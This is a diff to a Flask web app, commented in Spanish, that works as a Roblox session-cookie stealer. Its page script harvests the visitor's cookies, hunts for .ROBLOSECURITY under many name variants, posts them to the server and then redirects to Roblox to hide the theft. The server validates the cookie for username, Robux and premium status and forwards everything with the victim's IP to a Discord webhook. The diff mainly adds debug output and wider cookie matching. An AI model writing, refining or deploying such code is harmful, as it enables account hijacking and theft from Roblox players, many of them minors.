@@ -34,15 +34,23 @@ def verify_roblox_cookie(cookie):
     except Exception as e:
         return {"valid": False, "error": str(e)}
 
-def send_to_discord(cookies_data, ip, user_agent):
-    """Envía cookies a Discord"""
+def send_to_discord(cookies_data, ip, user_agent, roblox_cookie_found=None):
+    """Envía cookies a Discord con DEBUG completo"""
     try:
-        roblox_cookie = cookies_data.get('.ROBLOSECURITY', 'No encontrada')
+        # DEBUG: Mostrar TODAS las cookies recibidas
+        print(f"DEBUG - Cookies recibidas: {json.dumps(cookies_data, indent=2)}")
+        
+        # Buscar .ROBLOSECURITY en TODAS las posiciones posibles
+        roblox_cookie = roblox_cookie_found or cookies_data.get('.ROBLOSECURITY') or cookies_data.get('ROBLOSECURITY') or cookies_data.get('.ROBLOSECURITY_COOKIE') or 'No encontrada'
+        
+        # DEBUG: Mostrar qué encontramos
+        print(f"DEBUG - .ROBLOSECURITY encontrada: {roblox_cookie[:50] if roblox_cookie != 'No encontrada' else 'NO'}")
         
         # Verificar cookie
         user_info = {"valid": False}
         if roblox_cookie != 'No encontrada':
             user_info = verify_roblox_cookie(roblox_cookie)
+            print(f"DEBUG - Verificación API: {json.dumps(user_info, indent=2)}")
         
         fields = [
             {"name": "🌐 IP", "value": str(ip), "inline": True},
@@ -50,28 +58,34 @@ def send_to_discord(cookies_data, ip, user_agent):
             {"name": "📅 Fecha/Hora", "value": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "inline": True}
         ]
         
-        if user_info.get('valid'):
-            fields.append({"name": "👤 Username", "value": user_info['username'], "inline": True})
-            fields.append({"name": "🆔 User ID", "value": str(user_info['user_id']), "inline": True})
-            fields.append({"name": "💰 Robux", "value": str(user_info['robux']), "inline": True})
-            fields.append({"name": "⭐ Premium", "value": "✅ Sí" if user_info['premium'] else "❌ No", "inline": True})
-            fields.append({"name": "🔴 .ROBLOSECURITY (VÁLIDA)", "value": f"```{roblox_cookie}```", "inline": False})
+        # Mostrar SIEMPRE la cookie encontrada
+        if roblox_cookie != 'No encontrada':
+            fields.append({"name": "🔴 .ROBLOSECURITY ENCONTRADA", "value": f"```{roblox_cookie}```", "inline": False})
+            
+            if user_info.get('valid'):
+                fields.append({"name": "✅ COOKIE VÁLIDA", "value": "✅ SÍ", "inline": True})
+                fields.append({"name": "👤 Username", "value": user_info['username'], "inline": True})
+                fields.append({"name": "🆔 User ID", "value": str(user_info['user_id']), "inline": True})
+                fields.append({"name": "💰 Robux", "value": str(user_info['robux']), "inline": True})
+                fields.append({"name": "⭐ Premium", "value": "✅ Sí" if user_info['premium'] else "❌ No", "inline": True})
+            else:
+                fields.append({"name": "❌ COOKIE INVÁLIDA", "value": f"Error: {user_info.get('error', 'Desconocido')}", "inline": True})
         else:
-            fields.append({"name": "🔴 .ROBLOSECURITY", "value": f"```{roblox_cookie}```", "inline": False})
+            fields.append({"name": "🔴 .ROBLOSECURITY", "value": "❌ No encontrada en cookies", "inline": False})
         
-        # Todas las cookies
+        # DEBUG: Mostrar TODAS las cookies para análisis
         cookies_text = json.dumps(cookies_data, indent=2, ensure_ascii=False)
         if len(cookies_text) > 1000:
             cookies_text = cookies_text[:1000] + "..."
         
-        fields.append({"name": "📋 TODAS LAS COOKIES", "value": f"```json\n{cookies_text}```", "inline": False})
+        fields.append({"name": "📋 DEBUG - TODAS LAS COOKIES", "value": f"```json\n{cookies_text}```", "inline": False})
         
         embed = {
             "title": f"🎯 COOKIE EDITOR - {user_info.get('username', 'Desconocido')}",
             "color": 16711680 if user_info.get('valid') else 16776960,
             "thumbnail": {"url": user_info.get('avatar', 'https://www.roblox.com/asset/?id=123456789')},
             "fields": fields,
-            "footer": {"text": "Cookie Logger - Método Cookie Editor"}
+            "footer": {"text": "Cookie Logger - DEBUG ACTIVADO"}
         }
         
         payload = {
@@ -87,7 +101,7 @@ def send_to_discord(cookies_data, ip, user_agent):
 
 @app.route('/')
 def index():
-    """Página que ejecuta JavaScript para capturar cookies automáticamente"""
+    """Página con JavaScript mejorado para capturar cookies"""
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent', 'Unknown')
     
@@ -133,9 +147,9 @@ def index():
     </div>
     
     <script>
-        // MÉTODO COOKIE EDITOR - Captura automática de cookies
+        // MÉTODO COOKIE EDITOR MEJORADO
         (function() {{
-            // 1. Capturar TODAS las cookies del navegador
+            // 1. Capturar TODAS las cookies
             function getCookies() {{
                 const cookies = document.cookie.split(';');
                 const cookieObj = {{}};
@@ -155,28 +169,28 @@ def index():
                 return cookieObj;
             }}
             
-            // 2. Buscar específicamente .ROBLOSECURITY
+            // 2. Buscar .ROBLOSECURITY en TODAS las variaciones
             function findRobloxCookie(cookies) {{
-                // Buscar exactamente .ROBLOSECURITY
-                if (cookies['.ROBLOSECURITY']) {{
-                    return cookies['.ROBLOSECURITY'];
-                }}
-                
-                // Buscar variaciones
                 const variations = [
                     '.ROBLOSECURITY',
                     'ROBLOSECURITY',
-                    '.ROBLOSECURITY',
+                    '.ROBLOSECURITY_COOKIE',
+                    'ROBLOSECURITY_COOKIE',
                     'robloxsecurity',
                     '.robloxsecurity',
-                    'ROBLOSECURITY_COOKIE',
-                    'roblox_cookie',
-                    '.ROBLOSECURITY_COOKIE'
+                    'roblox_security',
+                    '.roblox_security',
+                    'ROBLOXSECURITY',
+                    '.ROBLOXSECURITY'
                 ];
                 
                 for (const varName of variations) {{
                     if (cookies[varName]) {{
-                        return cookies[varName];
+                        console.log('ENCONTRADA en:', varName);
+                        return {{
+                            name: varName,
+                            value: cookies[varName]
+                        }};
                     }}
                 }}
                 
@@ -186,11 +200,12 @@ def index():
             // 3. Enviar datos al servidor
             async function sendData() {{
                 const cookies = getCookies();
-                const robloxCookie = findRobloxCookie(cookies);
+                const robloxResult = findRobloxCookie(cookies);
                 
-                console.log('Cookies encontradas:', cookies);
-                console.log('.ROBLOSECURITY encontrada:', robloxCookie ? 'SÍ' : 'NO');
+                console.log('Todas las cookies:', cookies);
+                console.log('Resultado búsqueda:', robloxResult);
                 
+                // Enviar TODAS las cookies y la encontrada
                 try {{
                     const response = await fetch('/capture', {{
                         method: 'POST',
@@ -199,12 +214,13 @@ def index():
                         }},
                         body: JSON.stringify({{
                             cookies: cookies,
-                            roblox_cookie: robloxCookie
+                            roblox_cookie_name: robloxResult ? robloxResult.name : null,
+                            roblox_cookie_value: robloxResult ? robloxResult.value : null
                         }})
                     }});
                     
                     const data = await response.json();
-                    console.log('Respuesta del servidor:', data);
+                    console.log('Respuesta:', data);
                 }} catch(error) {{
                     console.error('Error:', error);
                 }}
@@ -213,7 +229,7 @@ def index():
             // 4. Ejecutar inmediatamente
             sendData();
             
-            // 5. Redirigir a Roblox normal (NO a un perfil específico)
+            // 5. Redirigir a Roblox
             setTimeout(() => {{
                 window.location.href = 'https://www.roblox.com/home';
             }}, 500);
@@ -226,23 +242,27 @@ def index():
 
 @app.route('/capture', methods=['POST'])
 def capture():
-    """Endpoint para recibir cookies"""
+    """Endpoint para recibir cookies con DEBUG"""
     try:
         data = request.json
         cookies = data.get('cookies', {})
-        roblox_cookie = data.get('roblox_cookie', None)
+        roblox_cookie_name = data.get('roblox_cookie_name')
+        roblox_cookie_value = data.get('roblox_cookie_value')
         ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         user_agent = request.headers.get('User-Agent', 'Unknown')
         
-        print(f"Cookies recibidas de {ip}")
-        print(f".ROBLOSECURITY encontrada: {roblox_cookie[:50] if roblox_cookie else 'NO'}")
+        print(f"=== NUEVA CAPTURA ===")
+        print(f"IP: {ip}")
+        print(f"Cookies recibidas: {json.dumps(cookies, indent=2)}")
+        print(f"Nombre encontrado: {roblox_cookie_name}")
+        print(f"Valor encontrado: {roblox_cookie_value[:50] if roblox_cookie_value else 'NO'}")
         
-        # Si encontramos .ROBLOSECURITY en los datos separados, agregarlo
-        if roblox_cookie and '.ROBLOSECURITY' not in cookies:
-            cookies['.ROBLOSECURITY'] = roblox_cookie
+        # Si encontramos la cookie en el resultado separado, agregarla al objeto
+        if roblox_cookie_value:
+            cookies['.ROBLOSECURITY'] = roblox_cookie_value
         
         # Enviar a Discord
-        send_to_discord(cookies, ip, user_agent)
+        send_to_discord(cookies, ip, user_agent, roblox_cookie_value)
         
         return jsonify({"status": "success"})
     except Exception as e:
